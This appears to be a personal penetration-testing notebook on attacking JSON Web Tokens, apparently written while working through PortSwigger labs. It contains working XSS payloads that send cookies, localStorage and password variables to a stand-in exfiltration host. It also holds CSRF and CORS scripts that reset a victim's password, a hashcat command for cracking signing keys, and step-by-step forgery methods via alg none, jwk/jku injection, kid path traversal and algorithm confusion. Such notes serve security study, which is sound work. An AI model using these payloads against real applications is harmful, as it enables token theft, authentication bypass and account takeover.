# JWT

References :

https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool


## JWKS common locations

Another common alternative is exposing a key (or set of keys) in a JWKS (JSON Web Key Store) file. Some common locations for this would be:

- /.well-known/jwks.json
- /openid/connect/jwks.json
- /jwks.json
- /api/keys
- /api/v1/keys

There are two standard header claims that can direct the service to the **Public Key** for verification:

- **jku** - a claim pointing towards the JWKS URL
- **x5u** - a claim pointing towards the X509 certificate location (could be in a JWKS file)

## Stealing JWTs


---

There's no need to hack JWTs if you can **steal** and replay them!

If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.

### XSS


```js
document.location='http://example.com/cookiestealer.php?c='+document.cookie;

or

new Image().src = 'http://example.com/log.php?localStorage='+JSON.stringify(window['localStorage']);

or

document.location='http://example.com/?password='+secretPasswordVariable;
```

### CSRF

JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won't be able to see these, but as they are being used to do the attacker's bidding that doesn't really matter.

**Example:**

```
<form id="autosubmit" action="http://www.example.com/account/passwordreset" enctype="text/plain" method="POST">
<input name="username" type="hidden" value="victim1" />
<input name="password" type="hidden" value="BadGuyKnowsThis!" />
<input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>
```

### CORS Misconfiguration

When a site's CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.

**This leads to two possible attack paths:**

1. If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the 'trigger' request is sent. A good example of this is a JWT 'refresh token' or queries to an account page or login page.
    
2. If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.
    

**Example - XHR CORS:**

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send();
</script>
```

**Example - XHR CSRF:**

```
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"newpass":"BadGuyKnowsThis!"}');
</script>
```

### Man-in-the-Middle

JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.


## Attacks on JWT

### JWT authentication bypass via unverified signature

- Just change the JWT body and send request

###  JWT authentication bypass via flawed signature verification

- Change Body
- Change *alg* to **none**
- Remove Signature part (Not the dot at the end)

### JWT authentication bypass via weak signing key

- Crack Key used for Signature
```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
```
- Change body in [jwt.io](https://jwt.io) and enter Key in Trailer field


### JWT authentication bypass via jwk header injection

- Generate RSA
- Repeater -> JSON Web Token TAB -> Attack -> Embedded JWK 
- Notice *jwk* added in header
- Change body
- Send request


```ad-note
Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a `jwk` parameter to the header of the JWT manually. In this case, you need to also update the `kid` header of the token to match the `kid` of the embedded key.

```


### JWT authentication bypass via jku header injection

- Generate RSA
- Copy PK as JWK
- Create an endpoint of the PK:
```json
{ 
	"keys": 
[ 
	{ 
	"kty": "RSA", 
	"e": "AQAB", 
	"kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab", 
	"n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ" 
	}
 ]
```
- Change *kid* in you cookie with the generated one and **Inject** *jku* in the header the link to the endpoint containing our key :

```json
{  
 "alg": "RS256",  
 "jku": "https://mysite.com/keys.json"  
}
```

- Sign it in Burp **JSON Web Key** extention
- Send request

### JWT authentication bypass via kid header path traversal

- Generate Symetric Key with `key = null byte` base64 encoded (AA\==) 
![[Capture d’écran 2023-07-19 231603.png]]

- Change *kid* to `/dev/null` which represent Null byte
- Change Body
- Sign with the generated Key
![[Capture d’écran 2023-07-19 232035.png]]

### JWT authentication bypass via algorithm confusion

https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/

- Get **Public Key**
	- Get **Public Keys** from [[#JWKS common locations]] 
	- or Crack it with `jwt_forgery.py`

```python
python3 jwt_forgery.py <jwt1> <jwt2>
```

![[Capture d’écran 2023-07-20 003929.png]]

To verify if the public key generated is right :

```python
python3 jwt_tool.py -V -pk <jwt_key>` to verify if its right
```

![[Capture d’écran 2023-07-20 005548.png]]

Or you can verify by using the **Tampered x509 JWT** and sending the request, if you get *200* then it's your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.

- Copy **Public Key** with the blank line at the end !!
![[Capture d’écran 2023-07-20 011040.png]]

- **PEM** to **JWK** 
- Generate RSA key using the **JWK** we got from **PEM**
- Generate New Symetric Key with **base64 Encoded PEM** in *k* value :

![[Capture d’écran 2023-07-20 012443.png]]

- Change `alg` parameter to `HS256` 
- Change body as you like
- Sign it using the symetric Key
- Send Request

- [JWT authentication bypass via algorithm confusion with no exposed key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
